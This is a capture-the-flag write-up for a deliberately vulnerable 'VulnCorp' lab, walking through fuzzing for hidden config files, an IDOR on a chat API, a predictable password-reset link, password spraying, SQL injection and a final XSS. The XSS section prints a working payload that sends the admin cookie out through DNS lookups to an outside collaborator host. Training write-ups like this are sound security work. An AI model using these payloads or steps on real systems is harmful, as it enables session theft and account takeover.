---
title: VulnCorp writeup
draft: false
tags:
  - xss
  - sqli
  - idor
date: 2025-02-25
---
# From initial recon to config file

We start with an OSINT domain `vulncorp.co.uk` and our lab instance `z4czp9fy.vulncorp.co.uk`. 


```bash
ffuf  -u http://z4czp9fy.vulncorp.co.uk/FUZZ -w common.txt -mc all -fc 404
admin                   [Status: 200, Size: 1417, Words: 353, Lines: 34, Duration: 28ms]
contact                 [Status: 200, Size: 3092, Words: 753, Lines: 83, Duration: 32ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 28ms]
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 45ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 26ms]
phpmyadmin              [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 36ms]
```

Doing basic subdomain recon we find a bunch of them:

```bash
gobuster vhost -u http://z4czp9fy.vulncorp.co.uk -w namelist.txt --append-domain
Found: chat.z4czp9fy.vulncorp.co.uk Status: 302 [Size: 0] [--> /login]
Found: prueba.z4czp9fy.vulncorp.co.uk Status: 302 [Size: 0] [--> /login]
Found: webmail.z4czp9fy.vulncorp.co.uk Status: 302 [Size: 0] [--> /login]
```



From `/admin` we see a link to a github repo: https://github.com/template-manager/template-manager. From the `git log` history of commits we find an interesting line:


```diff
diff --git a/README.md b/README.md
index 85a179f..4b8eb2e 100644
--- a/README.md
+++ b/README.md
@@ -2,3 +2,5 @@
 Template manager is a basic system built in PHP which can be used to build your website and translate URL's to templates.

 It also comes with an admin interface to control plugins
+
+When installing this product it will need write access to the project root directory to save config file with database settings.
```

Also we note that config files are saved with a specific pattern:

```php
$myfile = fopen(getcwd()."/../".date("YmdH").".cfg", "w");
```


In other words year, month, date and hour

```php
echo date("YmdH");
2025022517
```

We search for config files using this specific pattern:

```bash
ffuf -u http://z4czp9fy.vulncorp.co.uk/YEARmonthDAYhour.cfg \
-w <(seq 2019 2020):YEAR \
-w <(seq -w 1 12):month   \
-w <(seq -w 1 31):DAY     \
-w <(seq -w 0 23):hour

[Status: 200, Size: 131, Words: 1, Lines: 7, Duration: 26ms]
    * DAY: 02
    * YEAR: 2019
    * hour: 13
    * month: 10
```

This means that the config file is named `2019100213.cfg` (please note that it may vary). The file gives us database credentials and a flag:

```
DB_HOST=localhost
DB_DB=vulncorp_www
DB_USER=vulncorp_www
DB_PASS=************

[^FLAG^******^FLAG^]
```

# Phpmyadmin

Let's try those credentials with phpmyadmin and see what we can get:

![[Screenshot 2025-02-25 alle 18.42.57.png]]

We now have an username and a password hash that cracks immediately for instance using crackstation.net

If we go to `/admin` we can use those credentials and learn about an hash `b3XnP2gk`. We don't know the purpose of this hash yet, but it seems related to the chat subdomain.

# chat subdomain

We can register a user and have access to the API:

![[Screenshot 2025-02-25 alle 18.53.08.png]]

With the api credentials (follow the instruction to use the Api key) we can look around. We find this endpoint

```
GET /api/JEGZU6oh/user/78 HTTP/1.1
Host: chat.iqok0qxp.vulncorp.co.uk

{"id":78,"disabled":false,"name":"No Name","email":"our_email_address"}
```


We can determine the existence of other user ids, because of error messages like the following:

```
["You do not have access to this user"]
```

This happens with ids 8, 19, 50 and 77.

We would like to use the admin hash we obtained before, but in trying to do so we have this error:

```
GET /api/b3XnP2gk/user HTTP/1.1
["Account Hash does not match ApiKey Account"]
```

But if we try to use the admin hash on our specific user id instead we have different error:

```
GET /api/b3XnP2gk/user/78 HTTP/1.1
Host: chat.iqok0qxp.vulncorp.co.uk

["You do not have access to this user"]
```


Visiting the other ids we get a bunch of  details and also a flag on `GET /api/b3XnP2gk/user/77 HTTP/1.1`


# Resetting the password of other users


Now that we have valid email addresses, let's see if we can reset  the password of the only active user (this one will be the OSINT user we will find on a social netowrk):

```
{"id":19,"disabled":false,"name":"Danni Latowski","email":"danni.latowski.4d74650af0cf9095@vulncorp.co.uk"}
```

 We first use our email address to have a look at what a reset link looks like. We get something like this

```
GET /login/our_hash/78/1740514030 HTTP/1.1
Host: chat.iqok0qxp.vulncorp.co.uk
```

So we just need to initiate the reset of danni's password then  visit `/login/b3XnP2gk/19/timestamp` with the correct timestamp

Accessing the website contact page we get another flag.

# Accessing the  webmail

We have a bunch of interesting messages in the chat room:

```
Sent On: 12/02/19 10:23:53

**Danni:** Whoa! that's a weird email address!

Sent On: 12/02/19 10:24:39

**Dorothy:** oh I know, our CEO is paranoid about spam, and this seems to stop it

Sent On: 12/02/19 10:25:12

**Danni:** How do I know how to email other people in the company?

Sent On: 12/02/19 10:25:38

**Dorothy:** It's a little bit complicated but once you know how to do it it's easy!

Sent On: 12/02/19 10:25:53

**Dorothy:** You need to do an md5 hash of their first name and last name with a full stop in the middle ( make sure their name is in lowercase )

Sent On: 12/02/19 10:26:15

**Dorothy:** So for example yours would be md5("danni.latowski") and you just use the first half of the md5 and add if after their name.

Sent On: 12/02/19 10:26:53

**Dorothy:** Which makes mine: dorothy.matthams.184cfd3b07028cd1@vulncorp.co.uk

```

From the team page on the main website we can deduce valid email addresses using the rule mentioned above. Using a very simple password wordlist (the 100 most common passwords) we are soon able to access a valid account and get a new flag from a message in the inbox.

# SQLi on getUser

Inside the webmail we soon find an SQL vulnerability on the `/getUser?id=1` endpoint

The SQLi allows us to read other messages, and in particular we obtain another flag

```
<br><br>\\r\\nUsername: sania<br>\\r\\nPassword: ************\\r\\n<br><br>\\r\\nI cant remember the name of the login domain but it begins with \\"pru\\"\\r\\n<br><br>\\r\\nCheers<br><br>\\r\\nAndre<br><br>**********] | NAS Box Access | andre.alexander.068cbb15c66e5159@vulncorp.co.uk | 1555002645 
```

and most importantly credentials for a NAS box. We already know the domain from vhost enumeration so let's go there and get another flag.
# Inside the NAS

The first thing that comes to mind is requesting access to the private share, but we are warned.

![[Screenshot 2025-02-25 alle 22.02.14.png]]


Can we exfiltrate somthing? Maybe cookies? Using only DNS queries? First let's see it there is the possibility of an XSS with a very simple `img` payload:


```
<img src=//7u2jf9m0qs3lxlmtuq9hc74am1ssgi47.oastify.com>
```

and our collaborator soon gets an hit! 

This was the payload I used when I first tried the challenge:

```
<script>document.write('<img src=//'+document.cookie.replace(/=/,'.')+'.ovn0gqnhr942y2nav7aydo5rnit9h05p.oastify.com>')</script>
```

Here we are adding an img to the document where we embed the admin cookies  as subdomain.  We are careful and  change the `=` with a `.`, adding a further subdomain level. Our collaborator will greet us with something like this:


```
The Collaborator server received a DNS lookup of type A for the domain name token.*********.ovn0gqnhr942y2nav7aydo5rnit9h05p.oastify.com.
```

Using this cookie we have access to the private share and get another flag.

# osint

Search VulnCorp employees on Linkedin ;)
